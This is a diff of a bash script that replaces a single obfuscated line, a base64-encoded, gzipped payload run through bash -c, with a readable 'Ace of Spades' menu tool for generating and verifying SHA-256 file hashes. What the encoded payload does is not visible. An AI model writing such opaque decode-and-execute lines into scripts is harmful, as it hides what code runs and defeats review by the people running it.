@@ -1,1 +1,85 @@
-bash -c "$(echo H4sICGcGXGcAA0FjZV9vZl9TcGFkZXMAxVddT9swFH3vr7jrEB+bklIKPLTaJLSxwcuGYJo0sQmZ5Ka1SO3Odtgi4L/PNwluQ9uktDD8FH/k3ONzT66d169al1y0LpkeNBoffhx8ebfxc7vTOW/3OvvDjcbp4dnht2Jo2/YbfRSomMGLiMd4MbCvod7cgpsG2PZnYAfBqAR7EMpsiFoQI1Ouh8FAgofQXLuheHfN8kwze7x4sjYL/haq20GAICM4G7EQdfXS2wXxPxe6wSeS6CjTDSKp4FgY7CtuUviOikc8YIZLUYP/dPIsyn/ZNg//64i2qbvPhd/2M5GBgeaibyUnvz4h/s49fhxn0Bq4sMFCrjAwUqWr4nf83A9pTpw7l7A+40IbG4s+vtptzcPf9a3ztCH6Cn8nlnYIRspYwyaPQEgDPJ/GcGsZ/D0fTtEkSlhUGFrKMESRLKpKHf7z+T8vTFnZs5XJzSlkIXgjaB7aRChIZaLALucBdi2l/Glc75hGWMsHrYxunFp7q9TNlpfK4ww2WZkkt1knlw3t+/6Y7EOEB5zNAGHEzIASQs/0PpHPCjlNTAFYI5yDF1kKbk0TfvXobTG1eJyhotQR2dyitsqNEbrTRKnpAdvZ29fJsBRtWpVYY0XorLiSeSOZiLALVVARn6OYgDZ4GjyViXeiUGtgIoUrTEk75WxNKpKrbRam4Xu90tDOynmfU2hWsYADIR/YTpUNQsvofskSLihOO7cDhzXHDxEX5YieSUfWtFaavxhM2OXmDt4+1iYfXZWe9IqL9cJW6SxrlfzAIMXrz4xVbONAyDbUyS6DFeXDrVnEOOVdaEio3sEYo7aAeEEp5GPNceSO1UlzVOD9X3fsLuuO4rgnMcsnfqUVbBJfQSCHQ2a/R+96Qub199AK8bolkjiuTer4Na7Ltwt3DyFigVSYGJ5xmpPmJJTARsbro4FkFNKVen29PFxgg5eOAR/rghJhFlNC0wnSL+2CvWkX5LzzSxdpOXnvmgl5afld1QV6My/QsbhmMQ+Lu48PJ9aEmn7+inIzI+BCegRS2EMjwToVULMg64RSYONu9p9p4x8/XDTK3w4AAA== | base64 -d | gunzip)"
+#!/bin/bash
+
+CYAN='\033[1;36m'
+RESET='\033[0m'
+
+generate_file_hashes() {
+    while true; do
+        clear
+        echo -e "${CYAN}"
+        echo "     __________________________________________________________________________"
+        echo "    |                               Ace of Spades                              |"
+        echo "    |                  Generate File Hashes for Integrity Verification         |"
+        echo "    |__________________________________________________________________________|"
+        echo "    |                                                                          |"
+        echo "    |  Options:                                                                |"
+        echo "    |  1. Hash a single file                                                   |"
+        echo "    |  2. Hash all files in a directory                                        |"
+        echo "    |  3. Verify file integrity against a hash file                            |"
+        echo "    |  4. Install required tools (if not installed)                            |"
+        echo "    |  5. Return to main menu                                                  |"
+        echo "    |__________________________________________________________________________|"
+        echo -e "${RESET}"
+
+        read -p "Enter your choice: " choice
+        case $choice in
+            1)
+                clear
+                echo -e "${CYAN}Hashing a single file...${RESET}"
+                read -p "Enter the path to the file: " file_path
+                if [ -f "$file_path" ]; then
+                    echo "Generating hash for $file_path:"
+                    sha256sum "$file_path"
+                else
+                    echo "File not found: $file_path"
+                fi
+                read -n 1 -s -r -p "Press any key to return to the menu..."
+                ;;
+            2)
+                clear
+                echo -e "${CYAN}Hashing all files in a directory...${RESET}"
+                read -p "Enter the path to the directory: " dir_path
+                if [ -d "$dir_path" ]; then
+                    echo "Generating hashes for files in $dir_path:"
+                    find "$dir_path" -type f -exec sha256sum {} +
+                else
+                    echo "Directory not found: $dir_path"
+                fi
+                read -n 1 -s -r -p "Press any key to return to the menu..."
+                ;;
+            3)
+                clear
+                echo -e "${CYAN}Verifying file integrity against a hash file...${RESET}"
+                read -p "Enter the path to the hash file: " hash_file
+                if [ -f "$hash_file" ]; then
+                    echo "Verifying files using $hash_file:"
+                    sha256sum -c "$hash_file"
+                else
+                    echo "Hash file not found: $hash_file"
+                fi
+                read -n 1 -s -r -p "Press any key to return to the menu..."
+                ;;
+            4)
+                clear
+                echo -e "${CYAN}Installing required tools...${RESET}"
+                if ! command -v sha256sum &> /dev/null; then
+                    echo "sha256sum is not installed. Installing coreutils..."
+                    sudo apt-get update && sudo apt-get install -y coreutils
+                else
+                    echo "sha256sum is already installed."
+                fi
+                read -n 1 -s -r -p "Press any key to return to the menu..."
+                ;;
+            5)
+                echo "Returning to main menu..."
+                break
+                ;;
+            *)
+                echo "Invalid choice. Please try again."
+                read -n 1 -s -r -p "Press any key to continue..."
+                ;;
+        esac
+    done
+}
+
+generate_file_hashes
